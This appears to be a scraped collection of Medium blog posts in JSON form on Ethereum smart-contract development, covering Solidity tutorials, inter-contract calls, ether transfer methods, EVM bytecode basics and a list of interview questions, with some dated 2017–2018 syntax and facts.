than a second: 0.5 sec!hackernoon.comClap 50 times and follow me on Twitter: @vasa_develop", "responses": 9, "tags": ["Solidity", "Solidity Security", "Hackpedia", "Solidity Hacks", "Solidity Vulnerabilities"]}, {"title": "Let\u2019s Build Your First Smart Contract in Solidity and Truffle", "post_link": "https://medium.com/etherereum-salon/hello-ethereum-solan-contract-4643118a6119?source=search_post", "author_name": "Amazingandyyy", "author_link": "https://medium.com/@amazingandyyy", "publish_date": "2017-07-30", "last_modified_date": "2018-06-21", "readtime": "5.28", "claps": 881, "voters": 126, "content": "Let\u2019s Build Your First Smart Contract in Solidity and TruffleAmazingandyyyFollowJul 30, 2017 \u00b7 6 min readEveryone is talking about Blockchain/Ethereum/Smart Contracts, and the price of Ether just went up and down. In my opinion, to know the value of ether and to take the advantage of this Blockchain Technology, getting hands on and diving into the smart contract development is the best and most effective way. I hope this series of tutorials will inspire you and lead you to start learning and applying smart contracts.After this extremely short tutorials, you can tell people,I just build my first smart contract this morning! [plus learned to debug]In this first tutorial, you will learn writing solidity language and truffle CLI tool to write and deploy a hello-world contract in a reasonably short amount of time.All resources are available in my GitHub repo as following.amazingandyyy/the-good-ethereum-smart-contract-tutorialthe-good-ethereum-smart-contract-tutorial - Repo for The Complete Ethereum Smart Contract Development tutorials series.github.comBefore we build the exciting contract, let me share you something useful knowledge, in case your friends ask you.What is Solidity? \u2014 An OOP programming languageEthereum Network is a distributed, purely decentralized developer network. Developers can deploy and run an application on the network that others can execute it and make things work. The application is called smart contract, and the official programming language to write a contract is generally Solidity, an OOP-fashion programming language. You can think it\u2019s like Swift for iOS and Kotlin for Android app.What is truffle? \u2014 A CLI tool.Truffle is a CLI helper tool, it helps developers\u2019 life easier and make the development process faster.Let\u2019s get started.The fast way to install solidity is using npm. It\u2019s official package called solc. The installing process usually takes around 30~60 minutes\u2026 I know\u2026 it\u2019s painful to wait, but you only need to do it once. (if you already have it installed, skip and go to next step)$ npm i -g solcOpen a new tab/window in your terminal. Type npm install command to install truffle:$ npm i -g trufflecreate a project called hello-ethereum-salon-contract and go to the project$ mkdir hello-ethereum-salon-contract$ cd hello-ethereum-salon-contractMake sure you are in the right directory/folder, then let\u2019s use truffle init to init a project. Truffle is just a CLI tool which helps us generate some robotic code snippets following the official Solidity Style Guide .$ truffle init Next, open the project/this folder in your favorite editor such as VSCode, Atom, Vim\u2026etc. The structure of the project should now look like the following:.\u251c\u2500\u2500 contracts\u2502   \u2514\u2500\u2500 Migrations.sol\u251c\u2500\u2500 migrations\u2502   \u2514\u2500\u2500 1_initial_migration.js\u251c\u2500\u2500 test\u251c\u2500\u2500 truffle-config.js\u2514\u2500\u2500 truffle.js3 directories, 4 filesLet\u2019s just ignore all these files for now. Next, use truffle create contract -ContractName- to create a new contract. (Note, by convention, the contract name is Camel Case, for example, ItsNiceToMeetYouMyFriend)$ truffle create contract HelloEthSalonit should look like this now:.\u251c\u2500\u2500 contracts\u2502   \u251c\u2500\u2500 HelloEthSalon.sol\u2502   \u2514\u2500\u2500 Migrations.sol\u251c\u2500\u2500 migrations\u2502   \u2514\u2500\u2500 1_initial_migration.js\u251c\u2500\u2500 test\u251c\u2500\u2500 truffle-config.js\u2514\u2500\u2500 truffle.js3 directories, 5 filesAs you can see, there is a new file called HelloEthSalon.sol under the contracts folder and notice the extension of the file is called .sol and this is the file extension of solidity language, think like .js for JavaScript files or .html for HTML templates. This is what it looks like for the brand new HelloEthSalon.sol file.pragma solidity ^0.4.4;contract HelloEthSalon {  function HelloEthSalon() {    // constructor  }}As we can see, only the contract name is special. We are good to go, let\u2019s make some more exciting changes.Let\u2019s add two things:1. add one string global variable called message and initialize it with a content as 'Hello Ethereum Salon!' .2. add a new function called GetMessage() which will return the messageThe file should now look like following:pragma solidity ^0.4.4;contract HelloEthSalon {  string message = \"Hello Ethereum Salon!\";   function HelloEthSalon() {    // constructor  }  function GetMessage() return string {    return message;  }}Congratulations! You have your very first ever smart contract.But in order to make it smart, we need to make sure this contract/solidity code is correct and will not break down. It\u2019s easy, use truffle compile helper commands to check if everything is all right.$ truffle compileBoom! We got an error!\u279c truffle compileError parsing .../01-HelloWorld/contracts/HelloEthSalon.sol: ParsedContract.sol:6:3: ParserError: Expected token Semicolon got 'Function'  function HelloEthSalon() {  ^Compilation failed. See above.truffle complain there is a ParserError on line 6 which is token Semicolon got \u2018Function\u2019 .Nice catch! Let\u2019s fix it by add the missing ; at the end of line 4. Yes, change \u2018Hello Ethereum Salon!\u2019 to \u2018Hello Ethereum Salon!\u2019;do truffle compile again in your terminal;Oh! Again! one more error! (no worries, we will fix it together.)\u279c truffle compileError parsing .../01-HelloWorld/contracts/HelloEthSalon.sol: ParsedContract.sol:10:25: ParserError: Expected token LBrace got 'Return'  function GetMessage() return string {                        ^Compilation failed. See above.compiler throws aParserError on line 10 and it's Expected token LBrace got \u2018Return\u2019. This is not a healthy and understandable report as we want, but I get it: from my experience and official document, the return should be changed to returns ~~ Nice catch again.Let\u2019s run truffle compile again in the terminal; Boom!\u279c truffle compileError parsing .../01-HelloWorld/contracts/HelloEthSalon.sol: ParsedContract.sol:10:33: ParserError: Expected token LParen got 'string'  function GetMessage() returns string {                                ^Compilation failed. See above.One more errors, but TRUST me, this is the last one in this tutorial. Well this will not be the last errors you will get (if you keep learning and doing development like a rock star )\u2026 so please don\u2019t be afraid of these errors, Errors are the most healthy and good sign when you doing coding especially when you do smart contract development. When you do truffle compile , the compile helpfully, generously help us find out the critical error, isn\u2019t it so handy? \ud83d\ude03Let\u2019s fix the ParserError by add parenthesis to the string (how I know to solve it like this? from previous experiences), so change function GetMessage() returns string { to be function GetMessage() returns (string) {Let\u2019s run truffle compile again in the terminal;If you get no error messages(you may get many warnings messages, but they can be ignored here) and have it show Writing artifacts to ./build/contracts~Congrats! We finish our first, no-bug, tiny, sweet, contract! Cheers! Go buy a beer and like this post :)Nice! We get no errors now! The whole updated contract should be looked like following :)You know we can deploy this contract to Ethereum network right now! Anyone on the planet can call this contract such as HelloEthSalon.getMessage() and it will get a result as Hello Ethereum Salon !All resources are available in this github repo ->amazingandyyy/complete-ethereum-smart-contract-tutorialscomplete-ethereum-smart-contract-tutorials - Source code for tutorial: Build a HelloWorld Smart Contract.github.comNext, I will teach you how torun your contract and test it locally.deploy to testnetwork, and send it to your friends.deploy to live ethereum network, and send it to the world!If you enjoyed this article, please share with your developer/blockchain friends and claps if this write-up is anyhow inspiring and helpful. Please feel free to comment if you encounter any errors and any feedback will be appreciated.", "responses": 7, "tags": ["Ethereum", "Tutorial", "Blockchain", "Hello World", "Smart Contracts"]}, {"title": "Solidity tutorial: returning structs from public functions", "post_link": "https://medium.com/coinmonks/solidity-tutorial-returning-structs-from-public-functions-e78e48efb378?source=search_post", "author_name": "Bryn Bellomy", "author_link": "https://medium.com/@bryn.bellomy", "publish_date": "2017-07-11", "last_modified_date": "2019-05-21", "readtime": "2.35", "claps": 1104, "voters": 125, "content": "Solidity tutorial: returning structs from public functionsBryn BellomyFollowJul 11, 2017 \u00b7 3 min readIn the current version of Solidity (0.4.13, as of this writing), it\u2019s impossible to return a struct from a public function. For example, if you attempt to compile the following code, you will get two errors, one for each function that tries to do so:You can open this Gist in browser-solidity with the following link: http://ethereum.github.io/browser-solidity/#gist=03f9e536d033f81fe2a2df7a74a17ddf&version=soljson-v0.4.13+commit.fb4cb1a.jsAs you\u2019ll see, the compiler complains about both functions, getBryn and getPerson:TypeError: Internal type is not allowed for public or external functions.Confirmed, it\u2019s impossible to return structs.However, if you\u2019ve been coding in Solidity for a while, you might notice that the following works perfectly well:Because the mapping is public, Solidity automatically generates a getter for this function. That\u2019s odd, because the getter would have to return a Person struct, right? Let\u2019s dig in a little bit deeper.Let\u2019s deploy the above contract and run the following Javascript code:Okay, so what\u2019s going on here?Shouldn\u2019t the compiler complain when we ask it to generate a getter for a mapping that returns a Person struct?As it turns out, solc is smart enough to handle this case for us. Notice the return value from the invocation of project.people('0xdeadbeef'). It\u2019s an array, which is how Solidity tuples are returned to Javascript land. Alright, so we know that the getter is not returning a struct, per se, but rather a tuple. This is a big clue!When the compiler generates a getter for a mapping or an array where the element is a struct, it does something like the following:As you can see, the getter simply breaks the struct down into a tuple. No internal types (like structs) are exposed. As a result, we get the functionality we desired with no compiler error. We simply have to be careful about the ordering of struct fields\u2014if the order changes, we\u2019ll have to change any code that interacts with this getter, since the order of the tuple values will change as well.Knowing this, we can take a cue from Solidity\u2019s implementation of this mapping getter when writing our own functions that return structs.Returning arrays of structsSometimes we might need to return an array of structs to the caller. However, if we take the na\u00efve approach, we\u2019ll once again run into the same limitation\u2014we can\u2019t expose internal types.We learned above that we can \u201cdestructure\u201d a struct and return it as a tuple. To return an array of structs, we will do the same thing. Each value in the returned tuple will represent a field in the struct. But because we\u2019re trying to return many structs (and therefore, many values for each field), each field in the tuple will be an array.Check out the following code to get a better sense of how this might look:Getting data back in this format is, admittedly, a pain to deal with on the frontend. Depending on your frontend data model, you may very well have to write functions to \u201crebuild\u201d these structs from the data you receive. I\u2019ve thrown together a quick example to show you how you might go about doing that:Note that struct \u201cdestructuring\u201d is (hopefully) a temporary workaround. Solidity\u2019s behavior is expected to change at some point in the future, making this a bit more seamless.Find me around the web:Twitter: https://twitter.com/brynbellomyGithub: https://github.com/brynbellomyLinkedIn: https://www.linkedin.com/in/bryn-bellomy", "responses": 6, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Tutorial", "Programming"]}, {"title": "Calling the Function of Another Contract in Solidity", "post_link": "https://medium.com/@blockchain101/calling-the-function-of-another-contract-in-solidity-f9edfa921f4c?source=search_post", "author_name": "Bernard Peh", "author_link": "https://medium.com/@blockchain101", "publish_date": "2018-03-05", "last_modified_date": "2018-06-20", "readtime": "2.98", "claps": 985, "voters": 121, "content": "Calling the Function of Another Contract in SolidityBernard PehFollowMar 5, 2018 \u00b7 3 min readWhen we write Smart Contracts, we can write it in such a way that they can interact with existing deployed contracts. This feature is very powerful as it allows code reusability, ie treating deployed contracts like libraries. There has been a lot of effort done in this space but is still controversial at the time of writing. For example what would happen if the reused contracts are faulty (just like what happened to parity multi-sig wallet hack)?In this article, I am not debating about the immutability of deployed contracts or whether we should or should not interact with deployed contracts. Instead, I will be focusing on the different techniques to call functions of deployed contracts. I can see some use cases for it and I\u2019ll leave it up to the readers to implement what they believe in.Let\u2019s say we have deployed a very simple contract called \u201cDeployed\u201d that allows user to set a variable.pragma solidity ^0.4.18;contract Deployed {    uint public a = 1;        function setA(uint _a) public returns (uint) {        a = _a;        return a;    }    }and we want to deploy another contract later called \u201cExisting\u201d to change the variable of \u201ca\u201d in the \u201cDeployed\u201d contract.pragma solidity ^0.4.18;contract Deployed {        function setA(uint) public returns (uint) {}        function a() public pure returns (uint) {}    }contract Existing  {        Deployed dc;        function Existing(address _t) public {        dc = Deployed(_t);    }     function getA() public view returns (uint result) {        return dc.a();    }        function setA(uint _val) public returns (uint result) {        dc.setA(_val);        return _val;    }    }We do not need the full implementation of the \u201cDeployed\u201d contract, but rather just the function signatures as required by the ABI. Since we have the address of the \u201cDeployed\u201d contract, we could initialised the \u201cExisting\u201d contract with the address and interact with the \u201cDeployed\u201d contract using the existing setA and getA functions accordingly.This is easy and actually the recommended way to interact with deployed contracts. However, what if we don\u2019t have the ABI of the deployed contract? We can still call the \u201csetA\u201d function of the deployed contract.pragma solidity ^0.4.18;contract ExistingWithoutABI  {        address dc;        function ExistingWithoutABI(address _t) public {        dc = _t;    }        function setA_Signature(uint _val) public returns(bool success){        require(dc.call(bytes4(keccak256(\"setA(uint256)\")),_val));        return true;    }}Function signatures are 4 bytes long and the formula to generate it is to hash it with the keccak256 function, like so:bytes4(keccak256(\u201csetA(uint256)\u201d))We could pass a value to setA inside the call method. However, since the call (as well as delegatecall) method simply passes value over to the contract address and will not get any returned value, it doesn\u2019t know if setA has done its job correctly or not unless we check out the state of the \u201cDelegate\u201d contract.What if we want to get the returned value from setA? Unfortunately, there is no way to do that unless we use solidity\u2019s assembly code. Are you ready?pragma solidity ^0.4.18;contract ExistingWithoutABI  {        address dc;        function ExistingWithoutABI(address _t) public {        dc = _t;    }        function setA_ASM(uint _val) public returns (uint answer) {                bytes4 sig = bytes4(keccak256(\"setA(uint256)\"));        assembly {            // move pointer to free memory spot            let ptr := mload(0x40)            // put function sig at memory spot            mstore(ptr,sig)            // append argument after function sig            mstore(add(ptr,0x04), _val)            let result := call(              15000, // gas limit              sload(dc_slot),  // to addr. append var to _slot to access storage variable              0, // not transfer any ether              ptr, // Inputs are stored at location ptr              0x24, // Inputs are 36 bytes long              ptr,  //Store output over input              0x20) //Outputs are 32 bytes long                        if eq(result, 0) {                revert(0, 0)            }                        answer := mload(ptr) // Assign output to answer var            mstore(0x40,add(ptr,0x24)) // Set storage pointer to new space        }    }}Solidity\u2019s assembly code starts with the \u201cassembly\u201d keyword and wrapped in {}. I hope my comments in the code is clear. To get the returned value of setA without ABI, we have to understand how memory works in the EVM. Free memory is available at the 64th Byte (0x40), so we first move our memory pointer there. Then, we append the hexadecimals of the function signature and its argument sequentially at that spot. The function signature is 4 Bytes (0x04) and the argument is 32 Bytes (0x20), so we have 36 Bytes in total (0x24).Once done, we do the magic \u201ccall\u201d which stores the result back in the 64th Byte spot and returns a boolean, ie 1 or 0. The transaction will revert if call fails (returns a 0). Assuming everything is successful, we return the value at the 64th Byte spot, which is the answer we want.Try the code in remix and see for yourself.Happy coding.", "responses": 10, "tags": ["Ethereum", "Solidity", "Smart Contracts"]}, {"title": "Three methods to send ether by means of Solidity", "post_link": "https://medium.com/daox/three-methods-to-transfer-funds-in-ethereum-by-means-of-solidity-5719944ed6e9?source=search_post", "author_name": "Kirill Bulgakov", "author_link": "https://medium.com/@bulgakovk", "publish_date": "2018-02-20", "last_modified_date": "2018-07-01", "readtime": "2.74", "claps": 680, "voters": 112, "content": "Three methods to send ether by means of SolidityKirill BulgakovFollowFeb 20, 2018 \u00b7 3 min readSolidity supports several methods of transferring ether between the contracts. This article takes a detailed look at three variants and the main differences between them. There will also be suggestions given as to the use of one or another method depending on a specific situation.1. address.send(amount)The first method which was introduced for transferring ether is send(). It has two details that should be considered.First and the most important characteristic is providing 2300 gas limit for execution the fallback function of a contract receiving ether. By the way, this quantity will be sufficient only to create one event.For instance, the code listed below works correctly:contract Sender {  function send(address _receiver) payable {    _receiver.send(msg.value);  }}contract Receiver {  uint public balance = 0;  event Receive(uint value);    function () payable {    Receive(msg.value);  }}The second important aspect that should be paid attention to is as follows: unsuccessful execution of send(), for example out of gas error returns false, but does not throw an exception. Hence, each usage of send() should be inside of require. Otherwise you will pay for gas to proceed a transaction submission in the blockchain, but all the state changes will be undone.For example, it only takes to change a bit the payable function in the Receiver contract:function () payable {  Receive(msg.value);  balance += msg.value;}and your transaction will have a successful receipt, however the status will not change, as an out of gas error has occurred:2. address.transfer(amount)Let us consider a method that appeared in the later versions of solidity. It has two details worth mentioning as well.First, this method has the same 2300 gas limit. However during the development process of these features the developers discussed an opportunity to add .gas() modifier, which redefines the limit of the provided gas.Second, unlike send()method, transfer()throws exception when performed unsuccessfully. Thus, you get to know that your transaction is unsuccessful right at the execution attempt. Ethereum wallet or metamask will notify you about that:3. address.call.value(amount)( )The last and most customized method.The given function still returns false in case an error occurs, that is why keep the usage of require() in mind.Its principal difference from the two previous functions is an opportunity to set gas limit via .gas(gasLimit) modifier. It is necessary in case the payable function of the contract receiving ether performs a complex logic, that requires plenty of gas.Let us take a look at the following example:contract Sender {  function send(address _receiver) payable {    _receiver.call.value(msg.value).gas(20317)();  }}contract Receiver {  uint public balance = 0;    function () payable {    balance += msg.value;  }}Execution of the payable function in the Receiver contract costs more than 20 thousand gas. That is why, usage of send() or transfer() would cause an out of gas error. However thanks to gas() modifier the above-mentioned example works correctly.Please notice that this method is not safe against reentrancy and impact on the contract could be worse than its potential flexibility. Check out this blogpost for more details.SummaryFinally, let me share a chart which might guide you when choosing a suitable function according to the assigned task.", "responses": 7, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Cheatsheet"]}, {"title": "Solidity Bytecode and Opcode Basics", "post_link": "https://medium.com/@blockchain101/solidity-bytecode-and-opcode-basics-672e9b1a88c2?source=search_post", "author_name": "Bernard Peh", "author_link": "https://medium.com/@blockchain101", "publish_date": "2017-09-15", "last_modified_date": "2018-06-14", "readtime": "4.35", "claps": 1062, "voters": 113, "content": "Solidity Bytecode and Opcode BasicsBernard PehFollowSep 15, 2017 \u00b7 5 min readAs we go deeper into writing smart contracts, we will come across terminologies like \u201cPUSH1\u201d, \u201cSSTORE\u201d, \u201cCALLVALUE\u201d \u2026etc. What are they and should we even care about them?To know these commands, we have to go deeper into the Ethereum Virtual Machine (EVM). I was surprised there were very few resources on this subject when I googled around. Perhaps they were too technical? In this article, I\u2019ll try to explain some EVM basics as simple as I can.Like many other popular programming languages, Solidity is a high level programming language. We understand it but the machine doesn\u2019t. When we install an ethereum client such as geth, it also comes with the Ethereum Virtual Machine, a lightweight operating system that is specially created to run smart contracts.When we compile the solidity code using the solc compiler, it will translate our code into bytecode, something only the EVM can understand.Let us take a very simple contract for example:pragma solidity ^0.4.11;contract MyContract {    uint i = (10 + 2) * 2;}If we run this code in the remix browser and click on the contract details, we see lots of information.In this case, the compiled code is:60606040525b600080fd00a165627a7a7230582012c9bd00152fa1c480f6827f81515bb19c3e63bf7ed9ffbb5fda0265983ac7980029These long values are hexadecimal representation of the final contract, also known as bytecode. Under the \u201cWeb3 Deploy\u201d section of the remix browser, we see:...   {     from: web3.eth.accounts[0],      data: '0x606060405260186000553415601357600080fd5b5b60368060216000396000f30060606040525b600080fd00a165627a7a7230582012c9bd00152fa1c480f6827f81515bb19c3e63bf7ed9ffbb5fda0265983ac7980029',      gas: '4300000'   }, function (e, contract){    console.log(e, contract);    if (typeof contract.address !== 'undefined') {         console.log('Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);    } })In simple terms, it means that when we deploy the contract, we simply deploy the hexadecimals under the data field with the recommended gas of 4300000.We have to start thinking hexadecimal if we want to talk to the EVM. Ever wonder why there is a \u201c0x\u201d in front of your wallet or transaction address? That\u2019s right, anything beginning with \u201c0x\u201d simply means the value is in hexadecimal format. Having \u201c0x\u201d in front of a hexadecimal is not compulsory because the EVM will treat any value as hexadecimal irregardless.We also see the operation code (aka opcode):PUSH1 0x60 PUSH1 0x40 MSTORE PUSH1 0x18 PUSH1 0x0 SSTORE CALLVALUE ISZERO PUSH1 0x13 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST JUMPDEST PUSH1 0x36 DUP1 PUSH1 0x21 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x60 PUSH1 0x40 MSTORE JUMPDEST PUSH1 0x0 DUP1 REVERT STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 SLT 0xc9 0xbd STOP ISZERO 0x2f LOG1 0xc4 DUP1 0xf6 DUP3 PUSH32 0x81515BB19C3E63BF7ED9FFBB5FDA0265983AC798002900000000000000000000Opcodes are the low level human readable instructions of the program. All opcodes have their hexadecimal counterparts, eg \u201cMSTORE\u201d is \u201c0x52\u201d, SSTORE\u201d is \u201c0x55\" \u2026etc. Pyethereum github repo and the older Ethereum yellow paper have some good reference for all the solidity opcodes and their hexadecimal values.The EVM is also a Stack Machine. To explain simply, imagine stacking up slices of bread in a microwave, the LAST slice you put in is the FIRST one you take out. In computer science jargon, we call this LIFO.In normal arithmetic, we write our equation this way// Answer is 14. we do multiplication before addition.10 + 2 * 2In a stack machine, it works in LIFO principle2 2 * 10 + It means, put \u201c2\u201d in the stack first, followed by another \u201c2\u201d, then followed by multiplication action. The result is \u201c4\u201d sitting on top of the stack. now add a number \u201c10\u201d on top of \u201c4\u201d and eventually add the 2 numbers together. The final value of the stack becomes 14. This type of arithmetic is called Postfix Notation or Reverse Polish Notation.The act of putting data in the stack is called the \u201cPUSH\u201d instruction and the act of removing data from the stack is called the \u201cPOP\u201d instruction. Its obvious that the most common opcode we see in our example above is \u201cPUSH1\" which means putting 1 byte of data into the stack.So, this instruction:PUSH1 0x60means putting a 1 byte value of \u201c0x60\u201d in the stack. Coincidentally, the hexadecimal value for \u201cPUSH1\u201d happens to be \u201c0x60\u201d as well. Removing the non-compulsory \u201c0x\u201d, we could write this logic in bytecode as \u201c6060\".Let us go abit further.PUSH1 0x60 PUSH1 0x40 MSTORELooking at our favourite pyethereum opcode chart again, we see that MSTORE (0x52) takes in 2 inputs and produces no output. The opcodes above mean:PUSH1 (0x60): put 0x60 in the stack.PUSH1 (0x40): put 0x40 in the stack.MSTORE (0x52): allocate 0x60 of memory space and move to the 0x40 position.The resulting bytecode is:6060604052In fact, we always see this magic number \u201c6060604052\u201d in the beginning of any solidity bytecode because its how the smart contract bootstrap.To further complicate the matter, 0x40 or 0x60 cannot be interpreted as the real number 40 or 60. Since they are hexadecimal, 40 actually equates to 64 (16\u00b9 x 4) and 60 equates to 96 (16\u00b9 x 6) in decimal.In short, what \u201cPUSH1 0x60 PUSH1 0x40 MSTORE\u201d is doing is allocating 96 bytes of memory and moving the pointer to the beginning of the 64th byte. We now have 64 bytes for scratch space and 32 bytes for temporary memory storage.In the EVM, there are 3 places to store data. Firstly, in the stack. We\u2019ve just used the \u201cPUSH\u201d opcode to store data there as per the example above. Secondly in the memory (RAM) where we use the \u201cMSTORE\u201d opcode and lastly, in the disk storage where we use \u201cSSTORE\u201d to store the data. The gas required to store data to storage is the most expensive and storing data to stack is the cheapest.Assembly LanguageIt is also possible to write the whole smart contract using opcodes. That\u2019s where the Solidity Assembly Language comes in. It might be a lot harder to understand but could be useful if you want to save gas and do things that cannot be done by solidity.SummaryWe have only covered the basics of bytecode and a few opcodes. There are so many opcodes not yet discussed but you get the idea. Back the original question of whether we should even bother learning solidity opcodes \u2014 possibly yes and no.We don\u2019t need to know opcodes to start writing smart contracts and it adds to the learning curve. On the other hand, the EVM error handling is still very primitive at the time of writing and its handy to look at opcodes when things go wrong. At the end of the day, there is no harm learning more.", "responses": 5, "tags": ["Ethereum", "Solidity", "Blockchain", "Smart Contracts", "Cryptocurrency"]}, {"title": "The Ultimate Collection of Ethereum, Solidity and Smart Contracts Interview Questions", "post_link": "https://medium.com/@i6mi6/the-ultimate-collection-of-ethereum-solidity-and-smart-contracts-interview-questions-ef610d250012?source=search_post", "author_name": "Alexander Vitanov", "author_link": "https://medium.com/@i6mi6", "publish_date": "2018-03-08", "last_modified_date": "2018-06-15", "readtime": "10.1", "claps": 774, "voters": 113, "content": "Source: http://www.team2000-al.com/category/question-ideas/The Ultimate Collection of Ethereum, Solidity and Smart Contracts Interview QuestionsAlexander VitanovFollowMar 8, 2018 \u00b7 11 min readUpdated March 30You can use this collection of questions for interviews and as a cheatsheet to refresh your knowledge.Check back once in a while since I will keep updating this list.You can contribute here.Table of ContentsEthereum client (Geth)Smart Contracts and SolidityDApps and web3SolidityEthereumQ: What is the value token for Ethereum?A: Ether (ETH)Q: What is the difference between Wei and Ether?A: Wei is a denomination, like cents to Dollars or pennies to Pounds. 1 ETH = 10\u00b9\u2078 WeiQ: What is the average block time in Ethereum?A: ~14 secondsQ: What is the average block size in Ethereum?A: Around 2KB, although it depends.Q: Does Ethereum support scripting? If so, what types of scripting?A: Yes. It supports Smart ContractsQ: How do you get Ethers?A: There are a few ways:  1. Become a miner 2. Trade other currencies 3. Ether faucets like https://faucet.metamask.io 4. Receive Ethers from othersQ: Where do Ethers come from?A: 60 million were first created in a presale in 2014. Also, ethers are created when a block is mined.Q: What is a node?A: A node is essentially a computer, connected to the network, which processes transactions.Q: How many Ethereum networks are you familiar with?A: There are three types of network \u2014 Live Network (Main), Test Network (like Ropsten and Rinkeby) and Private Network.Q: What are some ways to interact with a network?A: You can either use a Wallet or a DAppQ: Can you \u201chide\u201d a transaction?A: No. All transactions are visible to everyone.Q: Where are transactions recorded?A: In the public ledger.Q: What are the ids of those networks?A: Live (id=1), Ropsten (id=3), Rinkeby (id=4), Private (assigned by the developer)Q: So I can mine some Ethers in Rinkeby and transfer them to Live network, right?A: No, you can\u2019t transfer Ether between networks.Q: Why would you have a private network?A: There are many reasons, but mainly because of data privacy, distributed database, permissions control and testing.Q: How can you easily see details about transactions and blocks?A: Using blockchain explorers like etherscan.io or live.ether.camp Q: What about private network?A: You can do it using open source explorer clients (like https://github.com/etherparty/explorer)Q: What is consensus in blockchain?A: The process of validating transactions (creating blocks) following a specific protocol (like Ethereum).Q: What are the two commonly used consensus models in blockchain?A: Proof of work and proof of stake.Q: Explain proof of work in a simple way.A: It is essentially a puzzle which miners have to solve in order to generate proof of work and validate a transaction. It is computationally intensive.Q: Explain proof of stake in a simple way.A: The creator of the block is chosen randomly by means of wealth and age (stake). It is not computationally intensive.Q: What consensus model does Ethereum use?A: As of the beginning of 2018 it uses Proof of work but it is going to switch to Proof of stake.Q: How can you mine Ethers?A: Using a wallet or geth cliQ: What is used to sign transactions?A: User\u2019s private key.Q: Can you recover your Ethereum account after losing your private key?A: Yes, you can use your 12 word mnemonic.Ethereum client (Geth)Q: What are some ways to connect to a node?A: IPC-RPC, JSON-RPC and WS-RPC.Q: So what is Geth?A: Geth is an Ethereum cli client.Q: What is the default way of connecting to a geth client?A: IPC-RPC is enabled by default, every other RPC is disabled.Q: What geth APIs are you aware of?A: Admin, eth, web3, miner, net, personal, shh, debug and txpool.Q: Which RPCs can you use to connect to a geth client over the network?A: You can connet to a geth client over the network using JSON-RPC and WS-RPC. IPC-RPC can only connect to geth clients on the same machine.Q: If you pass option \u2014 rpc which RPC gets enabled?A: JSON-RPC.Q: Which RPC APIs are enabled by default?A: eth, web3 and net.Q: How would you enable admin api for JSON RPC?A: By using the option \u2014 rpcapiQ: What does the option \u2014 datadir do?A: It specifies where the blockchain will be stored.Q: What is geth\u2019s \u201cfast\u201d sync, and why is it faster?A: Instead of processing the entire blockchain one link at a time and replay all transactions that ever happened, fast sync downloads transaction receipts along with the blocks and pulls an entire recent state database.Q: What does \u2014 testnet do?A: It connects the client to Ropsten network.Q: Starting the geth client dumps a lot of output on the screen. How would you reduce the noise?A: By setting \u2014 verbosity to a lower number (default is 3)Q: How can you connect one geth client to another using IPC-RPC?A: First start a geth client, copy its pipe location, then start another geth client using the same datadir and passing \u2014 attach with the pipe location.Q: How would you load custom javascript files into your geth console?A: By passing \u2014 preload and the path of the file.Q: Where are geth client accounts stored?A: In the keystore directory.Q: What do you have to do with an account in order to make transactions?A: You have to unlock that account with \u2014 unlock by passing the account address or index. You can also specify a \u2014 password file where all passwords reside for each account.Q: You mentioned something about indexes. What determines the account index?A: The order in which you add the accounts.Q: Is it possible to mine using geth?A: Yes, by passing \u2014 mine option.Q: What is \u201cetherbase\u201d?A: This is the account which receives the mining awards, which is account with index 0.Smart Contracts and SolidityQ: So what is a Smart Contract?A: It is computer code written in multiple languages. Smart contracts live on the network. They enforce rules and perform actions, negotiated by participants in those contracts.Q: What languages can Smart Contracts be written in? A: Solidity, which is the most commonly used language, Serpent and Lisp Like LanguageQ: Example of a Smart Contract use case?A: A popular Seller-Buyer scenario where a Buyer deposits money in the smart contracts, Seller sees the deposit and sends the goods, Buyer receives the goods and releases the payment.Q: What is Metamask?A: Metamask is a tool which helps you to easily interact with the Ethereum networks in your browserQ: What node does Metamask use?A: It uses infura.ioQ: What does Metamask NOT support?A: Mining and contract deployment.Q: Is execution of contracts free?A: No, invoking contract methods is a transaction.Q: Is accessing a Smart Contract state free?A: Yes, querying state is not a transaction.Q: Who executes the contracts?A: Miners.Q: Why does it cost money to invoke a method on a Smart Contract?A: Some methods, which do not modify the state of the contract and have no logic other than returning a value, are free.Apart from sending ether as a payment, invoking methods that make change the state cost money also because they require gas for execution.Q: Why is there gas, more precisely?A: Since miners execute contract code on their machines, they must cover their costs from executing the code requested by a caller.Q: Does gas price determine when a transaction is processed?A: Yes and no. The higher the gas price, the more likely your transaction will be mined. Despite, gas price is not a guarantee for faster transaction processing.Q: What does the gas usage in a transaction depend on?A: It depends on amount of storage, and type and number of instructions (opt codes). Each EVM opt code has a fixed amount of gas.Q: And how is transaction fee calculated?A: Gas used * gas price (specified by the caller)Q: If an execution of a Smart Contract costs less than the specified gas, does the user get a refund?A: YesQ: What happens if the execution of a Smart Contract costs more than the specified gas?A: The user doesn\u2019t get a refund and also the execution halts as soon as all the gas is used up and no changes are made to the contract.Q: Who pays for Smart Contracts invocation?A: The user who invokes the contract.Q: What do nodes run Smart Contracts code on? A: EVM \u2014 Ethereum Virtual Machine. EVM follows the EVM specification, which is part of the Ethereum protocol. EVM is simply a process on the node.Q: What does the EVM need in order to run a Smart Contract?A: It needs the contract\u2019s bytecode which is generated from compiling a higher-level language such as Solidity.Q: What are the segments of EVM on a higher level?A: Memory area, Stacks and Execution engine.Q: What is Remix?A: An online tool for developing, testing and deloying contracts. It\u2019s great for quickly building and testing lightweight contracts but not for more complex ones.Q: In Remix, what nodes can you connect to?A: You can connect to a public node using Metamask, local node using Geth and simulated memory node in the Javascript VM.Q: What is a DApp and why is it different than a normal App?A: An App usually consists of a client which communicates to some centralized resources (owned by an organization). There is a mid-tier connecting to a centralized data tier. If information in the centralized data tier is lost, it cannot be recovered (easily).DApp means Decentralized Application. DApps interact with the network via Smart Contracts. The data they work with resides in the contract instance.Centralized data can be compromised more easily than decentralized.DApps and web3Q: Is the front end of a DApp restricted to any technology/framework?A: No. You can use anything you want, like HTML, CSS, JS, Java, Python, the list goes on.Q: What does the front end use in order to connect to the backend (Smart Contracts)?A: Web3 API libraries.Q: What do you need in order to interact with a contract from a DApp?A: The contract\u2019s ABI and bytecode.Q: What is the ABI used for?A: ABI is a description of the public interface of a contract, which is used by DApps for invoking the contract.Q: What is the bytecode used for?A: The EVM on each node 